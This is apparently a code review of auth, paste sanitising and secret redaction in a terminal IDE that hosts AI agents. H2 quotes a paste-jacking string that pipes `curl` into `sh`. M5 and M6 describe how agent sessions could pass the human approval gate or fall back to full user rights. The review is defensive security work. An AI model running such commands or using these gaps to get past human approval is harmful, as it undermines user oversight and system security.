# Code Review: Phase 1 (1b auth, 1c paste sanitiser, 1d redaction)

## Scope
- Files: crates/kelpie-proto/src/{lib.rs,redact.rs}, crates/kelpie-proto/Cargo.toml, crates/kelpied/src/{auth.rs,server.rs,daemon.rs,session.rs,chat.rs,client.rs,main.rs}, app/src-tauri/src/{daemon_client.rs,lib.rs}, app/src/lib/{ipc.ts,quick-commands.ts,send-to-agent.ts,types.ts,store.ts,settings-catalog.ts}, app/src/components/{terminal-pane.tsx,app.tsx,settings/agent-settings.tsx}, locales/vi/settings.json, scripts/kelpie-call.py, scripts/e2e/daemon_auth.py, README.md, docs/architecture.md
- Hunks from concurrent work (priority/proc_tree, chat pinning, bench-echo, chat composer) were ignored.
- Spec: plans/261023-0048-multi-agent-ide-roadmap/phase-01-perf-gate-foundation.md 1b/1c/1d, amended by two user decisions: tiered auth that keeps the scripting surface, and redact living in ipc.ts.

## Overall assessment
The design is sound and small. The connection holds its role in the read loop, `auth` is handled inline so the next frame already sees the new role, tokens come from SHA-256 over a per-daemon secret, the comparison is constant-time, admin methods are on a deny-by-default allowlist, and only User connections may send raw Input frames. The app sends `auth` before anything else, re-reads the token on every reconnect, and ignores the error an older daemon returns. Typecheck is clean and the redact unit tests pass.

Nothing here is a security blocker, because the docs say plainly that the scheme is not a boundary against code running as the same user. Two problems do block marking the phase done:
- **H1**: the CLI picks credentials in a way that breaks perf_gate and e2e scripts run from inside a Kelpie terminal.
- **H2**: the user's own Ctrl+V clipboard paste still bypasses the sanitiser, so the 1c success criterion is not met.

The redactor also mangles ordinary type annotations (M1), which breaks the 1d criterion "no mangling of normal code".

## Critical issues
None.

## High priority

### H1. A session token is used against the wrong daemon: perf gate, e2e and dev-daemon commands fail inside a Kelpie terminal (regression)
- Evidence: `crates/kelpie-proto/src/lib.rs:221-229`. `cli_auth_params` uses `KELPIE_SESSION_ID` + `KELPIE_SESSION_TOKEN` whenever both are set, whatever `KELPIE_ENDPOINT` currently points at. `Client::connect` (`crates/kelpied/src/client.rs:27-29`) then fails hard with `invalid token`.
- Failing paths:
  - `scripts/perf/perf_gate.py:181,187,197` passes `{**os.environ, KELPIE_ENDPOINT: kelpie-perf-bench-…}` to `kelpied bench`.
  - `scripts/e2e/runs.py:48` and every e2e script that shells out to `kelpied` with an override endpoint.
  - `scripts/dev-daemon.sh` users running `kelpied terminal …` against the dev endpoint.

  All of these run fine from a normal terminal and all fail from a Kelpie terminal. That is the usual dogfooding setup and also how agents in Kelpie run these scripts. Only `daemon_auth.py` scrubs the variables.
- A related case: `kelpied bench` / `bench-echo` run inside a Kelpie terminal against the real daemon now authenticate as a Session. `session.attach` and `session.close` are not in `SCRIPTING` (`crates/kelpied/src/auth.rs:79-83`), so the benchmark aborts. README "Testing" lists `kelpied bench` without that caveat.
- Fix:
  1. Bind the session credential to its endpoint. Set `KELPIE_SESSION_ENDPOINT=<endpoint key>` next to the token in `session.rs:279` and `chat.rs:122`.
  2. In `cli_auth_params`, use the session token only when it matches `endpoint`; otherwise use the user token for that endpoint.
  3. Either give `bench`/`bench-echo` an explicit user-token connect (`Client::connect_as_user()`), or document that they run outside a Kelpie session.

### H2. The user's own clipboard paste still bypasses the sanitiser (1c criterion "no paste can break out of bracketed paste" not met)
- Evidence:
  - `app/src/lib/terminal-host.ts:219-226`. `pasteFromClipboard()` (Ctrl+V and Cmd+V, `:195-204`) and `paste()` call `term.paste(text)` with the raw text.
  - xterm 6 `bracketTextForPaste` wraps the text without stripping ESC (`@xterm/xterm/src/browser/Clipboard.ts:21-25`).
  - Clipboard text copied from a web page (`…\x1b[201~curl x|sh\r`) therefore ends the bracket early and runs as keystrokes. This is the most common paste-jacking vector.
  - Other paths that skip `typedText`: drag-drop paths (`components/app.tsx:115`), "Insert Path" (`file-tree.tsx:156`), "Insert: quick command" (`terminal-pane.tsx:110`).
- `typedText` was applied only in `typeInto` (`quick-commands.ts:38-39`).
- Fix: sanitise in one place, `TerminalHost.paste`/`pasteFromClipboard`: `this.term.paste(typedText(text))`. Then drop the extra call in `typeInto` for the view branch, but keep it on the `sendInput` fallback. That makes TerminalHost the single TS chokepoint the spec asked for.

## Medium priority

### M1. Redaction mangles ordinary code (type annotations and assignments)
- Evidence: `crates/kelpie-proto/src/redact.rs:41-46` (`ASSIGNMENT`). I checked the same pattern with Python `re`; it has no lookarounds, so it behaves the same:
  - `pub password: String,` becomes `pub password: [redacted],`
  - `  token: string;` becomes `  token: [redacted];`
  - `let token = getToken();` becomes `let token = [redacted]();`
  - `api_key: Option<String>` becomes `api_key: [redacted]<String>`
  - `def f(secret: Optional[str])` becomes `def f(secret: [redacted][str])`
  - `access_token: AccessToken` becomes `access_token: [redacted]`
- Hand-off and Copy Context carry exactly this kind of code. The test `leaves_ordinary_code_alone` covers none of these shapes.
- Fix (options):
  - Only mask `:` assignments when the value is quoted (`"…"`/`'…'`). Keep unquoted values for `=` only, and only on lines that look like env or config (`^\s*(export\s+)?NAME=`).
  - Or require that an unquoted value contains a digit and is at least 8 characters, and is not followed by `(`, `<`, `[` or `.`.
  - Add the cases above to the test.

### M2. Redaction false negatives worth covering
- `redact.rs:16-31`:
  - Stripe `sk_live_…` / `rk_live_…` are not matched (the `sk-` pattern needs a hyphen). I confirmed `STRIPE_KEY=sk_live_…` passes through untouched, because the name ends in `KEY` but not in `api_key`/`access_key`.
  - Also unmatched: npm `npm_…`, Hugging Face `hf_…`, PGP `-----BEGIN PGP PRIVATE KEY BLOCK-----`.
- Truncated PEM blocks: Copy Context takes the last 400 lines, so a key printed near the cut keeps its END marker but loses its BEGIN marker. The base64 body then leaks, because the pattern needs both markers.
- Values containing `:`, `&`, `(` or `,` are cut short. `PASSWORD=p@ss:wordverylong` is not masked at all.
- Fix:
  - Add `\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}`, `\bnpm_[A-Za-z0-9]{36}`, `\bhf_[A-Za-z0-9]{30,}`.
  - Make PEM `BEGIN … PRIVATE KEY( BLOCK)?-----` run to END or to the end of the text, and also mask a lone base64 run that ends at an END marker.
  - For quoted values, mask up to the closing quote.

### M3. Restricted / policy-off sessions still see every other session's spec through `session.list`
- Evidence: `auth.rs:85` allows `session.list` in `OWN`. `Daemon::list` (`daemon.rs:705`) returns `SessionInfo` with the flattened `SessionSpec` of every session: `env`, `args`, `cwd`, `agent_session_id` (`session.rs:44-71`). Per-session `env` can hold API keys.
- This contradicts "limited to their own session" in the README, the setting text and `docs/architecture.md`.
- Fix: in `server.rs`, when the role is not scripting, filter the `session.list` reply to the caller's id. Alternatively, add a `session.self` method and make `OWN` use it. `cli.rs:find_session` would then only resolve the caller's own session, which is what restricted mode wants anyway.

### M4. The `meta.set` own-folder check can be bypassed with `..`, symlinks or junctions
- Evidence: `auth.rs:114-118, 127-135` compares the raw strings. `MetaStore::set` then canonicalises (`meta.rs:35-41`), so a path like `<cwd>/../other` passes `within` and writes metadata for `other`. Impact is low (comment and board status only), but it does break the stated restriction.
- Fix: compare canonical keys, `within(&crate::meta::key(path), &crate::meta::key(&cwd))`, and add a case to `daemon_auth.py`.

### M5. `run.approve` (and `task_done`/`task_skip`/`cancel`/`retry`) let any scripting session pass the run's human approval gate
- Evidence: `auth.rs:81-82`. `runs.rs:3-4` describes the gate as "once the user approves it". An agent inside a run can run `kelpied run approve <run> <task>` on its own downstream gated tasks.
- This is a decision for the user, not a defect to fix silently. The decision was to keep the documented `run` surface, and `docs/user-guide.md:293` documents `approve`.
- Options:
  1. Keep it as it is, and say in the setting text that agents can approve run tasks.
  2. Move `run.approve` to user-only. This keeps the rest of the `run` verbs, and the gate stays meaningful.
  3. Allow it only when the setting is on and the caller is not a session of that same run.

  I recommend option 2.

### M6. The CLI silently falls back to the user token inside a session when only the token variable is missing
- Evidence: `lib.rs:221-229`. With `KELPIE_SESSION_ID` set but `KELPIE_SESSION_TOKEN` absent, the user token is used and the caller gets full admin rights.
- Environment scrubbers strip names containing `TOKEN`/`SECRET`/`KEY`. Codex documents `shell_environment_policy.ignore_default_excludes` for exactly this, and hardening guides tell users to turn the exclusions on. Under such a filter a "restricted" session, or one with the policy off, silently becomes User for every `kelpied` call.
- Fix: inside a session (`KELPIE_SESSION_ID` set and the endpoint matches, see H1), never fall back. Send no `auth`, or fail with "KELPIE_SESSION_TOKEN missing". Consider a name without TOKEN/KEY/SECRET, for example `KELPIE_SESSION_AUTH`, so ordinary secret filters do not break hooks and run reports.
- The docs already admit that same-user code can read the token file. The point is that the default path should not escalate on its own.

### M7. Test coverage gaps against the spec's Tests section
- No Rust test for the capability matrix. `auth.rs` tests only the token helper, `within` and the list-subset property. `authorize` with `Session`/`restricted`/policy-off is untested in `cargo test`, and so is the rewrite of `hook.report`/`run.report` to the caller's session.
- `daemon_auth.py` has no `kelpied run report` check. The spec's e2e explicitly says "`run report` still work".
- No check that a forged `KELPIE_SESSION_ID` with no token, run through the CLI, is not treated as that session. It currently falls back to the user token (M6).
- No measurement for "auth check ≤ 5 µs" or "redaction ≤ 2 ms per 64 KB".
- Fix:
  - Build a `Daemon::new(tempdir)` in a `#[cfg(test)]` in auth.rs and table-test `authorize`.
  - Add a `run.create` with one task in `daemon_auth.py`, then `kelpied run report done` from that session.
  - Add a `#[test]` that times `redact` on 64 KB of mixed code.

## Low priority
- **L1** `server.rs:156` clones `params` for every request, including User requests (`session.input` with large text, `agent.set_custom`, state blobs), even though `authorize` returns at once for User. Branch on `role == Role::User` before cloning.
- **L2** `auth.rs:72,95` → `Daemon::session_policy` → `by_id` scans every session and clones each `SessionSpec` (env map included) per RPC from a session. This is fine at today's session counts; a map from id to handle would make it O(1).
- **L3** `write_user_token` (`lib.rs:203-216`): `mode(0o600)` applies only when the file is created, so a file that already exists keeps its old mode. The write is also not atomic. Both are acceptable, because the token is written after the instance lock and before the server listens. On Windows the file inherits the `%LOCALAPPDATA%` ACL (user, SYSTEM, Administrators), which is fine. If `LOCALAPPDATA` is unset, the token falls back to `temp_dir()`. Consider an explicit `set_permissions` on Unix.
- **L4** The token file is never removed, so `daemon_auth.py` and perf runs leave `%LOCALAPPDATA%\Kelpie\auth\kelpie-auth-test-<pid>.token` behind on every run. Delete it on clean shutdown, or have the tests clean up.
- **L5** `daemon.set_policy` is sent twice on every connect: `store.ts:1300` and the effect in `components/app.tsx:70-73`. Keep only the effect.
- **L6** `redact.rs:65`: the `c[2].starts_with(MASK)` guard can never be true, because `[` is excluded from the value class. Remove it, or say why it is there.
- **L7** `restricted` can only be set through the API (`CreateParams.restricted`); there is no UI. It is also not carried over when a session is re-created rather than restarted (mode switch, hand-off). Confirm that this is intended.
- **L8** A newer daemon paired with an older, pre-token app gives an app where everything fails except `daemon.info`, and `checkDaemonApi` never prompts because `info.api >= app.api`. This is an edge case, since app and daemon ship together. The error text does name the cause.
- **L9** `regex = "1"` appears in both kelpie-proto and the Tauri crate instead of a `[workspace.dependencies]` entry. This is a nit.
- **L10** The spec deviation should be recorded. The spec said the "app token [is] kept in the OS keyring, read by app core only" and that "outside-session scripts [use the token only on] opt-in". The implementation uses a per-run token file that any same-user process can read, and outside scripts get it by default. That matches user decision (1), and a keyring would not stop same-user code either, but the phase file should say so.

## Acceptance check (as amended)
| Item | Status |
|---|---|
| 1b: session token issued at create, injected next to KELPIE_SESSION_ID (PTY + chat) | Done |
| 1b: app authenticates (user token) | Done. File instead of keyring, see L10 |
| 1b: capability table; unauthenticated callers get only daemon.info | Done |
| 1b: admin methods user-only; scripting surface kept by default; setting (default on) + restricted | Done. Gaps: M3, M4, M5 |
| 1b: CLI verbs keep working from sessions | Done for the same endpoint; broken for override endpoints (H1) and bench (H1) |
| 1b: API_LEVEL bumped; app handles an older daemon | Done (4 → 6; `auth` error from an old daemon is ignored; restart prompt) |
| 1c: one daemon sanitiser for prompt delivery | Done (`session::typed_text`, `session.rs:579`) |
| 1c: `session.input paste:true` path | Replaced by sanitising on the app side (acceptable). Clipboard paste not covered (H2) |
| 1c: TS/Rust parity | Verified. Both keep `\t`/`\n`, map `\r`/`\r\n` to `\n`, and drop Cc (U+0000–1F, U+007F–9F) |
| 1d: `kelpie_proto::redact` + `redact_batch` + TS wrapper in ipc.ts | Done |
| 1d: wired into hand-off, Copy Context, notes/issues/annotations sent to an agent | Done (`terminal-pane.tsx:88,100`, `send-to-agent.ts:30,34`) |
| 1d: no mangling of normal code | Not met (M1) |
| Tests: capability matrix in cargo test, run-report e2e, perf budgets | Partial (M7) |

## Regression sweep (b)
- **App ↔ daemon**: the auth frame is queued on `out_tx` before `out` is published, so no request can overtake it. It is re-sent on every reconnect with a freshly read token. Against an older daemon, the error reply with id `"auth"` fails `as_u64` and is ignored. OK.
- **`kelpied hook` / `run report` / `terminal` / `worktree` from sessions**: OK on the session's own endpoint. `hook.report` and `run.report` are rewritten to the caller's id (`auth.rs:101-105`).
- **Chat sessions**: the token is injected (`chat.rs:121-122`). Hooks only act on `Entry::Term`, as before.
- **Remote (SSH) sessions**: the local `ssh` process gets the variables. Nothing on the remote side can reach the local pipe, and no `SendEnv`/`RemoteForward` is used, so no token is needed or leaked.
- **Mobile**: `mobile.rs` dispatches through its own `handle` with device pairing auth, not the pipe. Unaffected.
- **Automations / runs**: they run inside the daemon. Task sessions get tokens through `create`. OK.
- **e2e harness (`smoke_support.daemon`)**: goes through the app's `daemon_call` as User. OK. Scripts that shell out to `kelpied` with an override endpoint are affected by H1 when started from a Kelpie terminal.
- **`kelpie-call.py`**: the user-token path mirrors `auth_token_path` exactly (endpoint key, ASCII-alphanumeric/`-`/`_` sanitising, base dirs). OK.
- **Daemon restart**: `auth::init` runs after the single-instance lock (`main.rs:169-178`), so a second instance cannot overwrite the running daemon's token. Restored sessions respawn with tokens from the new secret.
- **Env scrub**: `KELPIE_SESSION_TOKEN` was added to `PARENT_AGENT_ENV` (`main.rs:116`). OK.

## Security notes (d)
- Token derivation: SHA-256(secret ‖ 0 ‖ id) with a 256-bit secret from two UUIDv4s (OS CSPRNG), new per daemon. A session cannot derive another session's token. OK.
- `same()` is constant-time for equal lengths; leaking the length is harmless. OK.
- Escalation from a session through `session.create` (unrestricted, any argv/env) needs the policy on and an unrestricted caller, which is documented as the scripting surface. A restricted caller cannot create sessions or runs. The `env` of a created session cannot forge a token.
- Input frames: dropped unless the role is User (`server.rs:126-131`). Verified by e2e.
- Main residual risks: M6 (silent fallback to the user token) and M5 (approval gate).

## Verification run
- `cd app && pnpm typecheck`: passes.
- `cargo test -p kelpie-proto redact`: 4/4 pass.
- `cargo clippy -p kelpie-proto -p kelpied -- -D warnings`: kelpie-proto is clean; kelpied fails with 3 lints in code this diff does not touch (`cli.rs:73`, `daemon.rs:477`, `runs.rs:343`). auth.rs, server.rs, redact.rs and session.rs `typed_text` produce no lints. The 3 failures will still fail CI if CI runs clippy with `-D warnings`.
- Not run: `cargo test -p kelpied` (D: has 1.2 GB free) and `daemon_auth.py` (reported 30/30 by the implementer).

## Recommended actions (in order)
1. H1: bind the session credential to its endpoint; give bench/bench-echo a user-token connection.
2. H2: run `typedText` inside `TerminalHost.paste`/`pasteFromClipboard`.
3. M1: tighten `ASSIGNMENT` and add tests for annotations and calls.
4. M6: no fallback to the user token inside a session; consider renaming the variable.
5. M3 and M4: filter `session.list` for OWN callers; compare canonical meta paths.
6. M5: ask the user about `run.approve`.
7. M7: cargo-test the capability matrix; add a run-report e2e check and the perf assertions.
8. Low items as time allows.

## Unresolved questions
- Is `run.approve` by agents intended under "keep the documented `run` surface" (M5)?
- Should `restricted` get a UI, or be inherited by sessions a restricted session's hand-off or mode switch creates (L7)?
- Is the user-token file in place of a keyring accepted as a recorded deviation (L10)?

Status: DONE_WITH_CONCERNS
Summary: The auth, sanitiser and redaction design is sound and nothing is a security blocker. H1 (the session token is sent to whatever endpoint is configured, which breaks perf_gate, e2e and bench inside Kelpie terminals) and H2 (clipboard paste is not sanitised, so the 1c criterion is unmet) should be fixed before Phase 1 is marked done. M1 (redact mangles type annotations) breaks the 1d criterion.
